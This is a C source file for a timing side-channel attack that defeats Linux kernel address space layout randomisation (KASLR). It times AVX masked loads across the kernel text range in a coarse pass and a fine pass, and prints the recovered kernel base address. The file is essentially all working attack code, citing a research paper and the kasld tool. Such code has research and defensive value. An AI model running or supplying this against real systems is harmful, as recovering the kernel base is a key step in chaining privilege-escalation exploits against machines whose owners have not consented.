// AVX masked-load KASLR text-base finder, self-contained (no hardcoded base).
// Stage 1: coarse 2 MiB scan of the kernel-text window.
// Stage 2: fine 4 KiB scan around the best coarse slot.
// Under KPTI the entry trampoline (__entry_text, ~12 KiB = 3 pages, at _text+0x10)
// stays mapped in the user page table; it shows as 3 consecutive low-delta pages,
// and the first of them is _text.
//
// Formulation (matches kasld avx_maskload.c / Choi-Kim-Shin, arXiv 2304.07952):
//   vpxor ymm1,ymm1,ymm1 ; repeat BATCH times: vmaskmovps (addr),ymm1,ymm0
//   time the batch with rdtsc, MEDIAN over ITERS, then DELTA vs an unmapped hole
//   page timed in the same iteration. The delta (not absolute cycles) is what
//   carries the signal.
#define _GNU_SOURCE
#include <errno.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <sys/mman.h>
#include <cpuid.h>

#define KMIN 0xffffffff80000000ul
#define KMAX 0xffffffffc0000000ul
#define COARSE_STEP 0x200000ul
#define COARSE_N ((KMAX - KMIN) / COARSE_STEP)
#define FINE_HALF 0x400000ul /* +/- 4 MiB around the coarse winner */
#define FINE_STEP 0x1000ul
#define FINE_N ((2 * FINE_HALF) / FINE_STEP)
#define ITERS 400
#define BATCH 32

static int cmp_i64(const void *a, const void *b) {
  int64_t x = *(const int64_t *)a, y = *(const int64_t *)b;
  return x < y ? -1 : x > y;
}

static uint64_t one_batch(unsigned long addr) {
  uint64_t t0, t1;
  __asm__ volatile("vpxor %%ymm1, %%ymm1, %%ymm1\n\t"
                   "mov %3, %%ecx\n\tlfence\n\trdtsc\n\tshl $32, %%rdx\n\tor %%rdx, %%rax\n\t"
                   "mov %%rax, %0\n\tlfence\n\t1:\n\tvmaskmovps (%2), %%ymm1, %%ymm0\n\t"
                   "dec %%ecx\n\tjnz 1b\n\tlfence\n\trdtsc\n\tshl $32, %%rdx\n\tor %%rdx, %%rax\n\t"
                   "mov %%rax, %1\n\t"
                   : "=&r"(t0), "=&r"(t1) : "r"(addr), "i"(BATCH)
                   : "rax", "rcx", "rdx", "ymm0", "ymm1", "memory", "cc");
  return t1 - t0;
}

static int64_t delta(unsigned long addr, unsigned long ref) {
  static int64_t s[ITERS];
  for (int i = 0; i < ITERS; i++) { uint64_t a = one_batch(addr), b = one_batch(ref); s[i] = (int64_t)a - (int64_t)b; }
  qsort(s, ITERS, sizeof s[0], cmp_i64);
  return s[ITERS / 2];
}

static int has_avx(void) {
  unsigned int eax, ebx, ecx, edx, xcr0_lo, xcr0_hi;
  if (__get_cpuid_max(0, NULL) < 1) return 0;
  __cpuid(1, eax, ebx, ecx, edx);
  if (!((ecx >> 27) & 1) || !((ecx >> 28) & 1)) return 0;
  __asm__ volatile(".byte 0x0f, 0x01, 0xd0" : "=a"(xcr0_lo), "=d"(xcr0_hi) : "c"(0));
  (void)xcr0_hi;
  return (xcr0_lo & 0x6) == 0x6;
}

static sigjmp_buf jb;
static void on_fault(int sig) { (void)sig; siglongjmp(jb, 1); }

int main(void) {
  if (!has_avx()) { printf("NO-AVX\n"); return 1; }
  cpu_set_t set; CPU_ZERO(&set); CPU_SET(0, &set); sched_setaffinity(0, sizeof set, &set);
  unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  unsigned char *hole = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  memset(page, 1, 4096); munmap(hole, 4096);
  signal(SIGSEGV, on_fault); signal(SIGBUS, on_fault);
  if (sigsetjmp(jb, 1) != 0) { printf("FAULT: masked-off load faults here (no suppression)\n"); return 1; }

  /* control */
  { static int64_t s[ITERS]; uint64_t tm, tu;
    for (int i=0;i<ITERS;i++) s[i]=one_batch((unsigned long)page); qsort(s,ITERS,sizeof s[0],cmp_i64); tm=s[ITERS/2];
    for (int i=0;i<ITERS;i++) s[i]=one_batch((unsigned long)hole); qsort(s,ITERS,sizeof s[0],cmp_i64); tu=s[ITERS/2];
    printf("control: mapped=%lu unmapped=%lu\n",(unsigned long)tm,(unsigned long)tu);
    if (tm<2*tu || tu<2*tm) { /* order can be either way; just report */ } }

  /* stage 1: coarse */
  static int64_t c[COARSE_N]; int best=-1;
  for (int i=0;i<COARSE_N;i++){ c[i]=delta(KMIN+(unsigned long)i*COARSE_STEP,(unsigned long)hole); if(best<0||c[i]<c[best])best=i; }
  unsigned long focus = KMIN + (unsigned long)best*COARSE_STEP;
  printf("coarse best slot 0x%016lx delta=%ld\n", focus, (long)c[best]);

  /* stage 2: fine around focus */
  static int64_t f[FINE_N];
  unsigned long lo = focus - FINE_HALF;
  for (int i=0;i<FINE_N;i++) f[i]=delta(lo+(unsigned long)i*FINE_STEP,(unsigned long)hole);
  /* find longest run of pages below (median - big margin); report run start */
  static int64_t srt[FINE_N]; memcpy(srt,f,sizeof srt); qsort(srt,FINE_N,sizeof srt[0],cmp_i64);
  int64_t med = srt[FINE_N/2];
  int64_t thr = med - (med < 0 ? -med/4 : med/4) - 200; /* well below floor */
  int run=0,bestrun=0,bestat=-1;
  for (int i=0;i<FINE_N;i++){
    if (f[i] < thr) { if(++run>bestrun){bestrun=run;bestat=i-run+1;} } else run=0;
  }
  printf("fine median=%ld threshold=%ld longest_run=%d at 0x%016lx\n",
         (long)med,(long)thr,bestrun, bestat>=0? lo+(unsigned long)bestat*FINE_STEP : 0);
  if (bestat>=0 && bestrun>=2) {
    unsigned long kb = lo + (unsigned long)bestat*FINE_STEP;
    printf("KBASE=0x%016lx  (run=%d pages)\n", kb, bestrun);
  } else {
    printf("KBASE=0x%016lx  (coarse only; no fine run)\n", focus);
  }
  return 0;
}
